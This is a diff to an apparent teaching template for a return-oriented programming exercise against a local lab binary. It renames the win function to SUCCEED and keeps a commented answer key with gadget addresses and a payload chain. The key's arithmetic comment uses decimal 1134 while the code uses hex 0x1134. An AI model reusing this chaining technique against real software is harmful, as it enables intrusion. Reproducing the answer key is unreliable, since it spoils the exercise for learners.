@@ -5,28 +5,28 @@ io = process(['./run.sh', 'part3'])
 
 io.recvuntil(b"Enter some bytes: ")
 
-# TODO: Fill in the address for gadgets and win function
+# TODO: Fill in the address for gadgets and succeed function
 GADGET_1 = 0x0
 GADGET_2 = 0x0
 GADGET_3 = 0x0
 GADGET_4 = 0x0
 GADGET_5 = 0x0
-WIN      = 0x0
+SUCCEED  = 0x0
 
 # ans
 # GADGET_1 = 0x800003f0
 # GADGET_2 = 0x80000400
 # GADGET_3 = 0x80000410
 # GADGET_4 = 0x80000428
-# WIN      = 0x80000448
+# SUCCEED  = 0x80000448
 
 
-# TODO: Complete the input_text that satisfy the requirement for win
+# TODO: Complete the input_text that satisfy the requirement for succeed
 input_text = b''
 
 # ans:
 # 
-# # a3_value -100 + 1234 = Target => a3_value = Target - 1134
+# a3_value -100 + 1234 = Target => a3_value = Target - 1134
 # TARGET = 0x5A5A5A5A
 # a3_value = TARGET - 0x1134
 
@@ -37,13 +37,8 @@ input_text = b''
 # input_text += p32(GADGET_2)
 # input_text += p32(GADGET_3)
 # input_text += p32(GADGET_4)
-# input_text += p32(WIN)
+# input_text += p32(SUCCEED)
 
 io.sendline(input_text)
 
-while True:
-    try:
-        cur_char = io.recv(1).replace(b'\r', b'')
-        print(cur_char.decode(), end='')
-    except UnicodeDecodeError:
-        pass
+io.interactive()
